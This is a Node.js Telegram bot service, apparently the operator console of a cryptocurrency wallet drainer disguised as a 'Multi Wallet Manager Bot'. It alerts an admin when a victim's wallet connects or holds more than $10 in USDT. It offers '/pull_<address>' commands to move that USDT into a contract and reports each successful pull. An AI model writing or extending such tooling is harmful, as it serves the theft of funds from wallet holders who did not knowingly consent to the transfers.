const TelegramBot = require('node-telegram-bot-api');
const env = require('./environment');

class TelegramService {
    constructor() {
        this.bot = null;
        this.adminChatId = env.ADMIN_CHAT_ID;
        this.isInitialized = false;
    }

    init() {
        try {
            if (!env.TELEGRAM_BOT_TOKEN) {
                console.warn('Telegram bot token not provided, Telegram service disabled');
                return;
            }
            
            this.bot = new TelegramBot(env.TELEGRAM_BOT_TOKEN, { polling: true });
            
            // Command handlers
            this.bot.onText(/\/start/, (msg) => {
                this.sendWelcomeMessage(msg.chat.id).catch(console.error);
            });

            this.bot.on('polling_error', (error) => {
                console.error('Telegram polling error:', error);
            });

            this.bot.on('webhook_error', (error) => {
                console.error('Telegram webhook error:', error);
            });

            this.isInitialized = true;
            console.log('Telegram bot initialized successfully');
        } catch (error) {
            console.error('Telegram bot initialization failed:', error);
            this.isInitialized = false;
        }
    }

    async sendNewWalletAlert(walletAddress, balance) {
        if (!this.isInitialized) return;
        
        try {
            const message = `
🔔 NEW WALLET CONNECTED
Address: ${walletAddress}
USDT Balance: ${balance} USDT

Actions:
/pull_${walletAddress} - Pull USDT to contract
`;
            return await this.bot.sendMessage(this.adminChatId, message);
        } catch (error) {
            console.error('Failed to send new wallet alert:', error);
        }
    }

    async sendBalanceAlert(walletAddress, balance) {
        if (!this.isInitialized) return;
        
        try {
            const message = `
💰 BALANCE ALERT
Address: ${walletAddress}
USDT Balance: ${balance} USDT (> $10)

Actions:
/pull_${walletAddress} - Pull USDT to contract
`;
            return await this.bot.sendMessage(this.adminChatId, message);
        } catch (error) {
            console.error('Failed to send balance alert:', error);
        }
    }

    async sendSuccessMessage(walletAddress, amount, txHash) {
        if (!this.isInitialized) return;
        
        try {
            const message = `
✅ SUCCESSFUL PULL
Address: ${walletAddress}
Amount: ${amount} USDT
Transaction: ${txHash}

Actions:
/clear_${walletAddress} - Clear this alert
`;
            return await this.bot.sendMessage(this.adminChatId, message);
        } catch (error) {
            console.error('Failed to send success message:', error);
        }
    }

    async sendMessage(chatId, message, options = {}) {
        if (!this.isInitialized) return;
        
        try {
            return await this.bot.sendMessage(chatId, message, options);
        } catch (error) {
            console.error('Failed to send message:', error);
            throw error;
        }
    }
    
    async sendWelcomeMessage(chatId) {
        if (!this.isInitialized) return;
        
        try {
            const message = `
Welcome to Multi Wallet Manager Bot!

Available commands:
/start - Show this message
/help - Show help information
`;
            return await this.bot.sendMessage(chatId, message);
        } catch (error) {
            console.error('Failed to send welcome message:', error);
        }
    }
}

module.exports = new TelegramService();
